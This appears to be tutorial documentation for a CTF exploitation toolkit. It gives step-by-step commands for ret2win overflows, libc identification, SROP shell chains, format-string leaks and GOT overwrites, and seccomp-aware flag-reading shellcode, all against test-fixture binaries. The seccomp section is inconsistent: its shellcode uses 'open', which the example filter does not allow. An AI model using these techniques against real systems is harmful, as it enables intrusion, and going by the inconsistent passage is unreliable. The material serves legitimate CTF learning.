# Tutorials

End-to-end walkthroughs using `abcpwn` against real CTF-style
challenges. Each tutorial uses a fixture from `tests/fixtures/` so
you can run the commands verbatim. Fixtures and their construction
scripts live in the source tree; see `tests/fixtures/binaries/`.

The commands assume `abcpwn` is on your `PATH` and your shell is in
the repository root.

## 1. Solving a ret2win challenge

A "ret2win" is the canonical first stack-overflow challenge: the
binary contains a function (often called `win` or `flag`) that
prints the flag, but no normal control flow reaches it. The exploit
overflows a stack buffer to redirect execution to `win`.

### Inspect the binary

```bash
abcpwn info tests/fixtures/binaries/ret2win
```

Confirm:

- NX is enabled (we cannot execute the stack).
- PIE is off (return addresses are absolute).
- No stack canary (so overflow does not need a leak).

### Find the win symbol

```bash
abcpwn syms tests/fixtures/binaries/ret2win --type funcs | grep -i win
```

Note the address (call it `0x401200`).

### Find the buffer offset

```bash
abcpwn cyclic 200
```

Run the binary, feed the output, observe the crash address, then:

```bash
abcpwn cyclic --search <four bytes from crash>
```

The number it prints is the byte offset from buffer start to saved
RIP.

### Build the payload

```bash
python3 -c "import sys; sys.stdout.buffer.write(b'A'*72 + (0x401200).to_bytes(8, 'little'))" > payload.bin
```

Or generate the same with `abcpwn pack` and `cyclic`:

```bash
OFFSET=$(abcpwn cyclic --search 0x6161616a)
abcpwn cyclic $OFFSET > /tmp/pad
abcpwn pack 0x401200 | abcpwn unhex > /tmp/ret
cat /tmp/pad /tmp/ret > payload.bin
```

### Emit a pwntools solve

```bash
abcpwn template ret2win tests/fixtures/binaries/ret2win -o solve.py
```

The generated `solve.py` is a starting point; edit `OFFSET` and the
target tube and run it.

## 2. Finding the right libc with `abcpwn libc id`

You have leaks from a remote process and need to know which libc the
remote is running so you can compute correct offsets.

### Capture leaks

Run the challenge to a point where it leaks one or two libc
function addresses, e.g. via a GOT leak:

```
puts   @ 0x7f0011aabbb0
printf @ 0x7f0011aaca50
```

Only the low 12 bits matter (the page-aligned offset within libc).

### Identify the libc

```bash
abcpwn libc id --offset puts:0xbb0 --offset printf:0xa50
```

Output is the unique matching libc id (or a list of candidates if
two libcs share these low bits).

### Get the rest of the offsets

```bash
abcpwn libc offsets <libc-id> | grep -E '(system|binsh|environ)'
```

The output is enough to finish a ret2libc.

### Download the libc image (optional)

If you want to test against the actual `libc.so.6`:

```bash
abcpwn --allow-network libc download <libc-id>
```

The archive lands in `~/.cache/abcpwn/libc/<id>/`. Run `abcpwn info`
on it to confirm.

## 3. Building a SROP chain from scratch

Sigreturn-Oriented Programming uses the kernel's `rt_sigreturn`
machinery to set every register from a stack-resident frame in a
single gadget.

### Find the syscall gadget

```bash
abcpwn gadget tests/fixtures/binaries/srop --filter 'syscall; ret$'
```

Pick the first hit; that is your single-syscall gadget. Note the
address.

### Find the rt_sigreturn constant

```bash
abcpwn constgrep RT_SIGRETURN_X86_64
```

On x86_64 the syscall number is `15`.

### Build the frame

```bash
abcpwn srop --arch x86_64 \
    rip=0x401234 rsp=0x404300 \
    rdi=0x404308 rsi=0 rdx=0 rax=59
```

`0x401234` is your `execve` syscall target (gadget). `0x404308` is
where the string `/bin/sh\0` lives on the stack you control. The
output is the raw frame; concatenate behind the gadget address and
you have a chain.

### Emit a solve skeleton

```bash
abcpwn template srop tests/fixtures/binaries/srop -o solve.py
```

## 4. Format string: offset to leak to write

A format string vulnerability gives you both a primitive read (via
`%s`, `%n`) and a primitive write (via `%n`, `%hn`, `%hhn`). You
need three things in order:

1. The positional offset where your input lands.
2. A leak (canary, libc address, code address) to defeat ASLR or
   stack canary.
3. A targeted write to GOT or a return address.

### Find the offset

Send a probe like `AAAA%X.%X.%X.%X.%X.%X.%X.%X` and capture the
output. Then:

```bash
abcpwn fmt --find-offset 'AAAA%X.%X.%X.%X.%X.%X.41414141'
```

(Replace `41414141` with the actual hex of where `AAAA` shows up.)

The output gives you the positional index (e.g. `7`) where your
input starts.

### Leak the canary

If you found the offset is `7`, and the stack canary is two slots
above your input:

```
%9$lx
```

reads the canary. (`abcpwn fmt --help` includes a payload formatter
for common leak shapes.)

### Build a GOT-overwrite payload

You want to overwrite `puts@got.plt` (at `0x404020`) with
`0x4011aa` (a `win` function), using offset `7`:

```bash
abcpwn fmt --write 0x404020=0x4011aa --offset 7
```

The output is a ready-to-send payload that uses `%hn` for two-byte
writes to avoid the giant counter inflation of a four-byte `%n`.

### Putting it together

```bash
abcpwn template fmt-leak tests/fixtures/binaries/fmt -o solve.py
```

Edit the offsets and addresses in the generated script.

## 5. Dumping and emulating a seccomp filter

CTF challenges often install a seccomp filter that restricts which
syscalls the process can make. The first job is to read the filter;
the second is to know which syscall numbers it permits.

### Dump the filter

```bash
abcpwn seccomp dump tests/fixtures/binaries/seccomp
```

`abcpwn` finds the embedded BPF program (the binary calls
`prctl(PR_SET_SECCOMP, SECCOMP_MODE_FILTER, ...)`) and extracts the
instruction array.

### Decode the BPF program

```bash
abcpwn seccomp disasm < dumped.bpf
```

Output is human-readable cBPF: load syscall number, compare against
allowed list, allow or kill.

### Find which syscalls are permitted

The decoded output explicitly tags `ALLOW`, `KILL_PROCESS`, and
`ERRNO`. A common challenge filter:

```
ALLOW read, write, exit, exit_group
KILL anything else
```

means you cannot call `execve` directly; you need a `read` then
`write` shellcode (open / read / write the flag file).

### Build a compatible shellcode

```bash
abcpwn shellcode --preset read-flag --arch x86_64
```

The `read-flag` preset opens `/flag`, reads it, and writes the
contents to stdout. It only uses `open`, `read`, `write`, and `exit`
syscalls. Confirm against the filter:

```bash
abcpwn shellcode --preset read-flag --arch x86_64 \
  | abcpwn disasm --arch x86_64
```

The disassembly should show only the four permitted syscalls.

### Emulate (optional)

If your build includes Unicorn:

```bash
abcpwn seccomp emu --filter dumped.bpf --syscall execve
abcpwn seccomp emu --filter dumped.bpf --syscall read
```

`emu` runs the filter against a synthetic syscall and reports the
verdict, which is more reliable than reading the disassembled output
for complex filters with bit manipulation.
